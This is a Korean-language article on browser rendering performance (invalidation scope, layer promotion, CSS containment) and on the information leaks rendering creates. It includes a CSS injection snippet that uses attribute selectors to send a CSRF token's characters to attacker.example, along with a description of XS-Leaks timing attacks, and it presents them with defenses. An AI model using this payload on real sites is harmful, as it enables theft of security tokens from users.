## 1. 무효화 범위

프레임 예산은 60Hz 기준 약 16.7ms다. 그 안에 자바스크립트 실행, 스타일 계산, 레이아웃, 페인트, 합성이 전부 들어가야 한다. 따라서 성능 문제는 "얼마나 빠른 코드를 쓰는가"보다 **어느 단계부터 다시 도는가**로 결정된다.

| 바꾸는 것 | 스타일 | 레이아웃 | 페인트 | 합성 |
|---|---|---|---|---|
| `width`, `height`, `font-size`, `display` | 재실행 | 재실행 | 재실행 | 재실행 |
| `color`, `background-color`, `box-shadow` | 재실행 | 건너뜀 | 재실행 | 재실행 |
| `transform`, `opacity` (승격된 레이어) | 건너뜀 | 건너뜀 | 건너뜀 | 재실행 |

세 번째 줄이 애니메이션에서 `transform`을 쓰라는 조언의 근거다. 이미 래스터된 레이어의 배치만 바꾸므로 메인 스레드가 거의 관여하지 않는다. 메인 스레드가 자바스크립트로 막혀 있어도 합성 스레드에서 애니메이션이 계속 도는 이유이기도 하다.

### 강제 동기 레이아웃의 정확한 조건

9편에서 짚은 내용을 조금 더 정확히 하면, 레이아웃을 강제하는 것은 **레이아웃 결과에 의존하는 값을 읽는 행위**다. `offsetTop`, `offsetWidth`, `getBoundingClientRect()`, `scrollTop`, `getComputedStyle()`의 일부 속성이 여기 해당한다.

```js
// 나쁨 — 쓰기와 읽기가 교대하면 반복 횟수만큼 레이아웃이 돈다
for (const el of items) {
  el.style.width = el.offsetWidth + 10 + 'px';
}

// 좋음 — 읽기를 먼저 모으고 쓰기를 몰아서 한다
const widths = items.map(el => el.offsetWidth);   // 레이아웃 1회
items.forEach((el, i) => el.style.width = widths[i] + 10 + 'px');
```

프레임워크의 DOM 일괄 처리가 하는 일이 이 분리다. 라이브러리를 쓰더라도 그 사이에 직접 기하 값을 읽는 코드를 끼워 넣으면 효과가 사라진다.

## 2. 레이어 승격의 대가

요소를 별도 레이어로 승격시키면 독립적으로 래스터되고, 움직일 때 합성만 다시 하면 된다. 그래서 `will-change`나 `transform: translateZ(0)`을 붙여 승격을 유도하는 기법이 널리 쓰인다.

대가는 메모리와 합성 비용이다.

- 레이어마다 GPU 메모리를 따로 쓴다. 화면 크기의 레이어가 수십 개면 상당한 양이다.
- 레이어 수가 늘면 합성 단계 자체가 병목이 된다. 각 프레임에서 처리할 레이어가 많아지기 때문이다.
- `will-change`를 스타일시트 전역에 뿌리면 페이지가 열려 있는 내내 그 메모리를 점유한다.

원칙은 **필요한 동안만 켜고 끝나면 끄는 것**이다. 애니메이션 시작 직전에 지정하고 완료 후 제거한다.

## 3. 무효화 범위를 좁히는 선언

기본적으로 한 요소의 크기 변화는 형제와 조상으로 전파된다. 브라우저는 어디까지 영향이 미치는지 알 수 없으므로 보수적으로 넓게 다시 계산한다.

`contain`은 개발자가 그 범위를 **선언**하게 한다. "이 요소 안의 변화는 밖에 영향을 주지 않는다"고 약속하면, 브라우저는 그 약속을 믿고 재계산을 서브트리 안으로 가둔다. 약속이 틀리면 렌더링이 깨지므로, 이것은 성능 최적화이면서 동시에 **개발자가 지는 계약**이다.

`content-visibility: auto`는 여기서 더 나아가 화면 밖 콘텐츠의 렌더링을 통째로 건너뛴다. 긴 목록에서 효과가 크다. 다만 이 기능은 뒤에 나올 정보 채널과 직접 닿아 있다. **렌더 비용의 차이를 크게 만든다**는 것은 그 차이를 관측하기도 쉬워진다는 뜻이기 때문이다.

## 4. 렌더링이 만드는 정보 채널

9편에서 짧게 언급한 부분을 여기서 펼친다. 핵심은 이것들이 **버그가 아니라 기능의 부산물**이라는 점이다.

### CSS만으로 값을 추출하는 경로

스크립트를 넣지 못하고 스타일만 주입할 수 있는 상황에서도 값을 빼낼 수 있다.

```css
input[name="csrf"][value^="a"] { background: url(https://attacker.example/?a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.example/?b); }
/* … 모든 문자에 대해 */
```

속성 선택자는 값의 접두사와 일치할 때만 매칭되고, 매칭된 규칙만 배경 이미지를 요청한다. 공격자는 어떤 요청이 왔는지로 첫 글자를 확정하고, 다음 단계에서 `value^="aa"`, `value^="ab"` 식으로 이어 간다. 한 글자당 문자 집합 크기만큼의 규칙이 필요하지만, 전체 탐색은 **글자 수에 선형**이다. 7편의 CRIME과 같은 구조다. 부분 일치가 관측 가능하면 지수 탐색이 선형이 된다.

`@import`를 이용해 각 단계를 순차적으로 로드하면 여러 라운드를 한 번의 주입으로 이어 붙일 수 있다. 방어는 두 갈래다. 외부 자원 로딩을 CSP로 제한하고, 민감한 값을 DOM 속성에 두지 않는다(토큰을 `value` 대신 스크립트 변수나 헤더로 전달).

### 렌더 비용의 차이로 상태를 추정하는 경로

다른 출처의 페이지를 프레임에 넣으면 내용은 읽을 수 없다(10편). 하지만 **그리는 데 걸리는 시간**은 관측될 수 있다.

로그인한 사용자에게는 긴 목록이, 그렇지 않은 사용자에게는 로그인 폼이 보이는 페이지가 있다고 하자. 두 경우의 렌더 비용이 다르면, 프레임을 붙인 쪽에서 그 차이를 재는 것만으로 피해자의 로그인 여부를 알 수 있다. 검색 결과의 유무, 특정 리소스에 대한 접근 권한도 같은 방식으로 추정된다.

이 계열을 XS-Leaks라고 부르고, 관측 가능한 신호는 렌더 시간 외에도 여러 가지다. 프레임 개수, 스크롤 가능 여부, 이미지 로드 성공 여부, 리소스가 캐시에 있는지 등이다. 브라우저가 캐시와 스토리지를 사이트별로 분할한 것(10편)이 이 중 캐시 기반 경로를 막기 위한 조치였다.

### 방어가 간접적일 수밖에 없는 이유

읽기를 막는 것과 반응의 차이를 없애는 것은 다른 작업이다. 선택자는 매칭돼야 하고, 렌더링은 내용에 따라 비용이 달라진다. 기능을 유지하면서 차이를 0으로 만들 수는 없다.

그래서 실무의 방어는 겹쳐 쌓는 형태가 된다.

- `frame-ancestors`로 프레이밍 자체를 거부한다. 관측 지점을 없애는 가장 직접적인 방법이다.
- `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`로 다른 출처와의 결합을 끊는다.
- `SameSite` 쿠키로 교차 사이트 요청에 인증 상태가 실리지 않게 한다. 상태 차이 자체가 사라진다.
- 민감한 판정의 응답을 형태적으로 통일한다. 상태 코드와 응답 크기를 맞추는 것까지 포함한다.

마지막 항목은 5편의 패딩 오라클 방어와 같은 원리다. **차이를 관측할 수 없게 만드는 것이 아니라, 차이가 생기지 않게 설계하는 것**이 근본이다.
